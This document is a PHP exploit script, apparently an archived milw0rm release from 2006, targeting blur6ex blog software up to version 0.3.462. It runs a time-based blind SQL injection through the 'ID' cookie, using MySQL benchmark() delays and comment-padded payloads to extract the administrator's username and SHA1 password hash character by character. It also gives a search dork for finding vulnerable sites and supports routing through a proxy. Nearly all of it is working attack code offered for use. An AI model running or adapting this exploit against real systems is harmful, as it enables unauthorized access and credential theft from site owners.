#!/usr/bin/php -q -d short_open_tag=on
<?
echo "blur6ex <= 0.3.462 'ID' blind SQL injection / admin credentials disclosure\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n";
echo "dork: \"powered by blur6ex\"\r\n\r\n";
/*
works regardless of php.ini settings
*/

if ($argc<3) {
echo "Usage: php ".$argv[0]." host path OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to blur6ex\r\n";
echo "Options:\r\n";
echo "   -T[prefix]   specify a table prefix different from default (no prefix)\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Example:\r\n";
echo "php ".$argv[0]." localhost /blur6ex/ \r\n";
echo "php ".$argv[0]." localhost /blur6ex/ -Tblur6ex_\r\n";
die;
}

/*
software site: http://www.blursoft.com/blur6ex/

vulnerable code in engine/shards/blog.php near lines 497-500:

...
case "proc_reply":
    // In order to set the permissions of the reply it's necessary to know what the parent is
    $permissionid = mysql_query("SELECT permission FROM blog WHERE ID=" . $_REQUEST['ID']);
...

'ID' argument in not sanitized before to be used in a sql query,
injection is blind...

this code shows how to use time delays through Mysql benchmark() function,
u can use this technique to ask questions of the target system
and retrieve data from tables

									      */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
   $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
   }
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

function my_encode($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$prefix="";
$proxy="";
for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
  $prefix=str_replace("-T","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$admin="";
$j=1;
while (!strstr($admin,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
  $starttime=time();
  echo "starttime -> ".$starttime."\r\n";
  $sql="99999 UNION SELECT IF((ASCII(SUBSTRING(username,".$j.",1))=".$i.") & 1, benchmark(50000000,CHAR(0)),0) FROM ".$prefix."permissiongroups WHERE PGroup=CHAR(97,100,109,105,110)";
  $sql=str_replace(" ","/**/",$sql);
  $sql=urlencode($sql);
  $packet ="GET ".$p."index.php?shard=blog&action=proc_reply HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Cookie: ID=".$sql.";\r\n"; //through cookies, log this
  $packet.="Connection: Close\r\n\r\n";
  echo quick_dump($packet)."\r\n";
  sendpacketii($packet);
  $endtime=time();
  echo "endtime -> ".$endtime."\r\n";
  $difftime=$endtime - $starttime;
  echo "difftime -> ".$difftime."\r\n";
  if ($difftime > 5) {$admin.=chr($i);echo "admin -> ".$admin."[???]\r\n";sleep(2);break;}
  if (($i==255) | (eregi("doesn't exist",$html))) {
  //debug
  echo $html."\r\n";
  die("Exploit failed...maybe wrong table prefix");
  }
}
$j++;
}
$admin=str_replace(chr(0),"",$admin);
echo "admin -> ".$admin."\r\n";

$password="";
$j=1;
while (!strstr($password,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
  $starttime=time();
  echo "starttime -> ".$starttime."\r\n";
  $sql="99999 UNION SELECT IF((ASCII(SUBSTRING(password,".$j.",1))=".$i.") & 1, benchmark(50000000,CHAR(0)),0) FROM ".$prefix."users WHERE username=".my_encode($admin);
  $sql=str_replace(" ","/**/",$sql);
  $sql=urlencode($sql);
  $packet ="GET ".$p."index.php?shard=blog&action=proc_reply HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Cookie: ID=".$sql.";\r\n";
  $packet.="Connection: Close\r\n\r\n";
  echo quick_dump($packet)."\r\n";
  sendpacketii($packet);
  $endtime=time();
  echo "endtime -> ".$endtime."\r\n";
  $difftime=$endtime - $starttime;
  echo "difftime -> ".$difftime."\r\n";
  if ($difftime > 5) {$password.=chr($i);echo "password -> ".$password."[???]\r\n";sleep(2);break;}
  if ($i==255) {die("Exploit failed...we have an admin user in 'permissiongroups' table, but for some reason there is not a '".$admin."' user in 'users' one...");}
}
$j++;
}
//if you are here...
echo "Exploit succeeded...\r\n";
echo "--------------------------------------------------------------------\r\n";
echo "admin          -> ".$admin."\r\n";
echo "password (sha1)-> ".$password."\r\n";
echo "--------------------------------------------------------------------\r\n";
?>

# milw0rm.com [2006-06-12]
